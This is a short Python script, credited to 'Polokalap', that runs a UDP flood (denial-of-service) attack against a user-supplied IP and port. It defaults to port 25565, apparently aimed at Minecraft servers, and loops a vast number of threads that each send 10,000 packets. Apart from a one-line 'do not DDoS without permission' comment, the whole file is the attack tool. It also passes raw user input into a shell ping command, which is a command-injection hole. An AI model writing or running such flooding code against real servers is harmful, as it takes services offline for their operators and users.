import os
import sys
import string
import socket
import random
import threading


#Script made by Polokalap!
#Rohek
#Do not DDoS Without permission.


packet_count = 0
print_lock = threading.Lock()

def attack(ip, port):
    global packet_count
    message = "Meow! "
    ip_addr = socket.gethostbyname(ip)
    ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ddos.connect((ip_addr, port))
    for i in range(10000):
        try:
            ddos.sendto(message.encode(), (ip_addr, port))
            with print_lock:
                packet_count += 1
        except socket.error as msg:
            print("|[Connection Failed] |")
    ddos.close()

def main():
    ip = input("Tell me the IP: ")
    ping = os.system(f"ping -c 1 {ip}")
    print(ping)
    port = int(input('Port: Use 0 for default '))
    if port == 0:
        port = 25565
    for i in range(1000000000):
        t = threading.Thread(target=attack, args=(ip, port))
        print("Sent", packet_count, "packets.")
        t.daemon = True
        t.start()
        t.join()
        i = i + 1

if __name__ == "__main__":
    main()
